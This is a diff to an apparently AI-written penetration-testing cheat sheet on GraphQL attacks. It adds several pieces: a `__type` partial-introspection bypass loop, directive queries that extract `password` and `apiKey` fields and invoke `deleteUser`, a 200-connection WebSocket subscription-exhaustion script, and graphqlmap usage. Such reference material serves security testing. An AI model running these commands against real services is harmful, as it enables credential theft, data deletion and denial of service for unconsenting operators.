@@ -19,6 +19,7 @@ GraphQL API attack techniques — introspection enumeration, batching abuse, inj
 | `GraphQL Voyager` | Visual schema explorer from introspection JSON |
 | `graphw00f` | GraphQL fingerprinting — identify engine (Apollo, Hasura, etc.) — `pip3 install graphw00f` |
 | `clairvoyance` | Schema inference when introspection is disabled — `pip3 install clairvoyance` |
+| `graphqlmap` | Automated GraphQL exploitation — `pip3 install graphqlmap` |
 | `curl` | Manual query/mutation testing |
 
 ---
@@ -95,9 +96,27 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 
 ---
 
-## Introspection Disabled — Field Suggestion Bypass
+## Introspection Disabled — Bypass Techniques
 
-When introspection is blocked, use field name suggestions (GraphQL returns "Did you mean X?"):
+When `__schema` is blocked, two approaches remain: `__type` queries (partial introspection) and field suggestion errors.
+
+### `__type` Query (Partial Introspection)
+
+Many servers block `__schema` but forget to block `__type`:
+
+```bash
+# Get type definition for a known or guessed type name
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __type(name: \"Query\") { fields { name description args { name type { name kind } } } } }"}'
+
+# Try common type names
+for type in Query Mutation User Admin Product Order; do
+  result=$(curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" \
+    -d "{\"query\":\"{ __type(name: \\\"$type\\\") { fields { name } } }\"}")
+  echo "$type: $(echo $result | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("data",{}).get("__type") or "null")')"
+done
+```
+
+### Field Suggestion Bypass
 
 ```bash
 # Trigger suggestion by sending near-miss field name
@@ -209,6 +228,32 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 
 ---
 
+## Directive Abuse
+
+GraphQL's built-in `@include` and `@skip` directives conditionally include fields. This can be abused to access fields that might be filtered or rate-limited when always present.
+
+```bash
+# @include — conditionally include a field based on a variable
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
+  "query": "query GetUser($showSecret: Boolean!) { user(id: 1) { username password @include(if: $showSecret) apiKey @include(if: $showSecret) } }",
+  "variables": {"showSecret": true}
+}'
+
+# @skip — include field when condition is false
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
+  "query": "query { user(id: 1) { username password @skip(if: false) } }"
+}'
+
+# Inline directive on sensitive mutation — try bypassing server checks that look for specific operation structure
+curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{
+  "query": "mutation { deleteUser(id: 1) @include(if: true) { success } }"
+}'
+```
+
+> [!tip] Some server-side auth middleware checks the static operation name/structure but not dynamic directive evaluation — directives can alter what fields resolve at runtime, potentially bypassing static analysis.
+
+---
+
 ## Denial of Service
 
 ```bash
@@ -220,6 +265,26 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 
 # Introspection DoS — if server doesn't cache schema resolution
 curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { fields { type { fields { type { fields { name } } } } } } } }"}'
+
+# Subscription exhaustion (WebSocket-based)
+# Open many long-lived subscription connections to exhaust server threads/connections
+python3 << 'EOF'
+import websocket, threading, time
+
+TARGET_WS = "ws://<target>/graphql"
+SUBSCRIPTION = '{"type":"start","id":"1","payload":{"query":"subscription { onNewMessage { id content } }"}}'
+
+def open_sub(i):
+    ws = websocket.WebSocket()
+    ws.connect(TARGET_WS, subprotocols=["graphql-ws"])
+    ws.send('{"type":"connection_init"}')
+    ws.send(SUBSCRIPTION.replace('"1"', f'"{i}"'))
+    time.sleep(60)  # hold connection open
+
+threads = [threading.Thread(target=open_sub, args=(i,)) for i in range(200)]
+for t in threads: t.start()
+for t in threads: t.join()
+EOF
 ```
 
 ---
@@ -248,6 +313,13 @@ clairvoyance -u http://<target>/graphql -o schema.json
 # graphql-cop — security audit tool
 pip3 install graphql-cop
 graphql-cop -t http://<target>/graphql
+
+# graphqlmap — automated exploitation (introspection, injection, dump)
+pip3 install graphqlmap
+graphqlmap -u http://<target>/graphql --method POST
+# Interactive shell: type 'help' for commands
+# dump_via_introspection — get full schema
+# dump_via_introspection | jq — pipe to jq for parsing
 ```
 
 ---
@@ -274,5 +346,5 @@ curl -s -X POST "http://<target>/graphql" -H "Content-Type: application/json" -d
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
